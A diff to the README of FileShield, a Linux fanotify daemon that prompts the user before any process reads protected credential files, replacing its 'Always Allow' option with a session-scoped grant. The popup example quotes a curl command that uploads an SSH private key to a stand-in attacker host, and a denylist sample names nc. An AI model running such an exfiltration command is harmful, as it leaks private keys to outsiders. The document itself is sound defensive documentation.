@@ -10,7 +10,7 @@
 
 - **True pre-access blocking**: The kernel suspends the `open()` syscall until FileShield responds — no race condition.
 - **Interactive prompts**: GUI popups (via `zenity` or `kdialog`) ask for permission before any data is exposed.
-- **Per-process allowlisting with TTL**: Grant access to a process for a configurable duration without repeated prompts.
+- **Flexible grants**: allow once (per-process TTL) or for the terminal session (`Allow Session`), with permanent allow/deny configured in `fileshield.conf`.
 - **SRE secrets covered by default**: AWS, kubeconfig, SSH keys, GCP, Azure, Vault token, Docker config, and more — out of the box.
 
 ---
@@ -35,12 +35,12 @@ Process syscall: open("/home/user/.aws/credentials", O_RDONLY)
   ├─ allowlist cache hit?  ─yes─▶  instant FAN_ALLOW
   └─ unknown process?      ─yes─▶  show GUI popup
                                         │
-              ┌──────────────┬──────────┴────────┬──────────────────┐
-           Allow Once   Always Allow           Deny            Always Deny
-              │               │                  │                   │
-        FAN_ALLOW        FAN_ALLOW          FAN_DENY             FAN_DENY
-        + cache TTL    + persist to         (one-off)          + persist to
-                      allowlist.json                           denylist.json
+              ┌──────────────┬──────────┴────────┐
+           Allow Once   Allow Session          Deny
+              │               │                 │
+        FAN_ALLOW        FAN_ALLOW          FAN_DENY
+        + per-process    + session          (this attempt)
+          TTL              subtree
               │
         syscall resumes (or fails with EPERM)
 ```
@@ -83,7 +83,7 @@ The daemon requires root (`CAP_SYS_ADMIN`) to open a `fanotify` permission fd �
 
 ## Usage
 
-Edit `fileshield.conf` to adjust protected paths or the allowlist, then reload:
+Edit `fileshield.conf` to adjust protected paths, the allowlist/denylist, or the session TTL, then reload:
 
 ```bash
 sudo systemctl reload fileshield
@@ -91,7 +91,7 @@ sudo systemctl reload fileshield
 sudo kill -HUP $(pidof fileshield)
 ```
 
-Sending `SIGHUP` to the daemon causes it to re-read `fileshield.conf`, remove old fanotify marks, and re-register the new set. Persisted *Always Allow* / *Always Deny* lists are reloaded from disk at the same time, so `fileshield-cli` changes take effect on reload.
+Sending `SIGHUP` to the daemon causes it to re-read `fileshield.conf`, remove old fanotify marks, and re-register the new set. Allowlist, denylist and TTL changes take effect at the same time.
 
 ### Default Protected Paths
 
@@ -171,55 +171,62 @@ When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/
    Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
 
    • Allow Once    — grant access this time only
-   • Always Allow  — trust this exact binary (SHA-512 verified)
-                   in this call chain; re-prompts if it changes
-   • Deny          — block access
+   • Allow Session — allow this binary while this terminal session lasts
+   • Deny          — block this attempt
    ```
 
 3. **Deny** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
-4. **Allow Once** → `FAN_ALLOW` — access granted, decision cached for the TTL.
-5. **Always Allow** → `FAN_ALLOW` — access granted **and** a runtime allowlist entry is created (see below).
+4. **Allow Once** → `FAN_ALLOW` — access granted and cached for `user_ttl` seconds for that process instance.
+5. **Allow Session** → `FAN_ALLOW` — access granted to this binary for the rest of the terminal session (see below).
 
-### Always Allow — runtime dynamic allowlist (persistent)
+### Allow Session — grant for the terminal session
 
-Clicking **Always Allow** stores a fingerprinted entry in the daemon's in-memory allowlist **and persists it to disk** for reuse after daemon restart or reboot:
+**Allow Session** exists for tools like `kubectl`, `ssh` or `aws` that
+are re-executed constantly: each invocation is a new PID, so a
+per-process cache never helps.
 
-| Attribute checked on every future match | Why |
-| --- | --- |
-| Binary path | Basic identity |
-| **SHA-512 of the binary** | Detects on-disk replacement (supply-chain attack) |
-| **Call chain** (up to 3 ancestors) | Prevents a different caller from inheriting the rule |
-| **SHA-512 of each ancestor exe** | Detects replaced parent binaries |
+- The grant is rooted at the process's session leader (your terminal
+  shell) when that is one of its ancestors, otherwise at the immediate
+  parent.
+- Any descendant of that process may read the protected files with the
+  same binary — a new `kubectl` from the same shell does not prompt.
+- The grant ends when that shell exits, or after `session_ttl` seconds
+  if a positive cap is configured. A new terminal always prompts.
+- The binary identity (device, inode, size, mtime) is captured at grant
+  time; replacing the binary on disk voids the grant.
 
-**Example:** clicking *Always Allow* for the popup shown above records:
+`session_ttl` is set in `[settings]`; the default `0` means the grant
+lives exactly as long as the session root.
 
-```text
-binary:         /usr/bin/git  (sha512: a3f1…)
-parent[0]:      code          (sha512: 7c82…)
-parent[1]:      systemd       (sha512: 0d4e…)
+### Permanent allow / deny (config)
+
+Permanent decisions are not made from the popup; edit the config and
+reload:
+
+```ini
+[allowlist]
+# Format: /absolute/path/to/binary = ttl_seconds
+# /usr/bin/ssh = 3600
+
+[denylist]
+# Never allowed, whatever the popup would say
+# /usr/bin/nc
 ```
 
-A future `git` call from `bash` instead of `code` will prompt again because the call chain differs. A trojaned `/usr/bin/git` will also prompt again because its SHA-512 has changed.
+- **Allowlist**: canonical binary path, cached for the configured TTL
+  when it matches. Prefer keeping this empty and using *Allow Session*,
+  because a replaced binary at the same path inherits silent access.
+- **Denylist**: canonical binary path; always wins over the allowlist
+  and over cached grants, and is re-evaluated on every event.
 
-#### Persistence
-
-*Always Allow* entries are stored in a JSON state file (`/var/lib/fileshield/runtime-allowlist.json`) with strict permissions (mode 0600, root-only). The entries are:
-
-- **Automatically loaded** when the daemon starts (on reboot, after systemctl restart, etc.)
-- **Immediately saved** when you click "Always Allow" (no manual action needed)
-- **Fail-secure**: if the state file is corrupted or unreadable, the daemon starts with an empty allowlist and reprompts
-
-To clear all persisted entries:
+Legacy runtime state from older versions
+(`/var/lib/fileshield/runtime-allowlist.json` and
+`runtime-denylist.json`) is still loaded at startup and honored, but the
+popup no longer writes new entries. To clear it:
 
 ```bash
-sudo rm /var/lib/fileshield/runtime-allowlist.json
+sudo rm /var/lib/fileshield/runtime-allowlist.json /var/lib/fileshield/runtime-denylist.json
 sudo systemctl restart fileshield
-```
-
-To view the current persisted entries:
-
-```bash
-cat /var/lib/fileshield/runtime-allowlist.json | jq .
 ```
 
 ---
@@ -227,8 +234,8 @@ cat /var/lib/fileshield/runtime-allowlist.json | jq .
 1. The daemon calls `fanotify_init(FAN_CLASS_CONTENT, O_RDONLY | O_LARGEFILE)`.
 2. It registers `FAN_OPEN_PERM` marks on each protected path via `fanotify_mark()`.
 3. When a process opens a watched file, the kernel delivers a `fanotify_event_metadata` event and **blocks the calling process**.
-4. The daemon resolves the binary path via `/proc/<pid>/exe` and checks the allowlist cache.
-5. On a cache miss, it spawns a `zenity` popup and waits for user input.
+4. The daemon resolves the binary path via `/proc/<pid>/exe` and checks the denylist, the allowlist, and the cached grants (per-process and per-session).
+5. On a cache miss, it shows a `kdialog`/`zenity` popup and waits for the user's decision.
 6. It writes a `struct fanotify_response` with `FAN_ALLOW` or `FAN_DENY` back to the fanotify fd.
 7. The kernel unblocks the original syscall with the appropriate result.
 
@@ -284,7 +291,7 @@ The daemon logs at the following levels:
 | Level | Events |
 | ------- | -------- |
 | `INFO` | Start/stop, config load, fanotify marks added/removed, reload |
-| `WARNING` | Failed marks (path not found), popup tool fallback |
+| `WARNING` | Missing protected paths, failed marks, popup tool fallback, session grant not recorded |
 | `ERR` | `fanotify_init` failure, config parse error, fork/exec failure |
 
 ---
@@ -318,18 +325,17 @@ This builds with `-O0 -g -fsanitize=address,undefined` and prints any memory err
 
 ## Running Tests
 
-Unit tests cover the cache, config parser, and utility functions. They require no root and no kernel fanotify support.
+Unit tests cover the cache (including session grants), config parser, persistence, and utility functions. They require no root and no kernel fanotify support.
 
 ```bash
 # Build and run all tests
 make test
 
-# Build tests without running
-make build/test_cache build/test_config build/test_utils
-
 # Run a single test binary directly
 ./build/test_cache
 ./build/test_config
+./build/test_persist
+./build/test_fanotify
 ./build/test_utils
 ```
 
@@ -348,7 +354,7 @@ Runs `cppcheck` over all sources in `src/` and `tests/`. Requires `cppcheck` to 
 ## Troubleshooting
 
 - **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` (KDE) or `zenity` (GNOME) is installed.
-- **Access blocked for a trusted process?** Add it to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
+- **Access blocked for a trusted process?** Use *Allow Session* in the popup, or add the binary to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
 - **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
 - **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
 - **All accesses denied with no popup on a headless machine?** FileShield requires a live desktop session to display dialogs. On headless hosts the daemon will deny all unknown accesses (fail-closed). Run in foreground mode and inspect the stderr output to confirm.
